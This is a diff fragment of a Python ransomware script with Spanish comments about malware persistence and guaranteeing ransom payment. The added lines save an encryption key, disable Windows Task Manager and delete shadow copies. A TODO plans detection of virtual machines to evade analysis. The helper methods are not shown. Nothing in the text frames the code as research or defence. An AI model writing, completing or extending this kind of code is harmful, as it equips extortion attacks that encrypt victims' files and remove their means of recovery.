@@ -17,15 +17,25 @@ import sys
 # a) Debemos garantizar la persistencia del malware en el dispositivo? => Por lo menos la herramienta para garantizar el pago y la desencriptacion de los datos
 
 if __name__ == '__main__':
+    print("Executing encryption protocol")
     cipher = Cipher(action='encrypt')
     cipher.save_key_as_file()
 
+    # TODO necesitamos no crear nada antes de detectar si estamos ejecutando en un windows o en una virtual machine
     if not cipher.is_windows():
         print('Nothing to do here')
-        # cleanup ?
+        # cleanup protocol here
         sys.exit()
 
-    
+    # TODO try except needed
+    # WORKING PROPERLY
+    cipher.disable_task_manager()
+    cipher.delete_shadowcopies()
+    print("Task manager disbled and shadow copies eliminated")
+    input("Press enter to end")
+
+    sys.exit()
+
     local_drives = cipher.get_local_drives()
     
     for ld in local_drives:
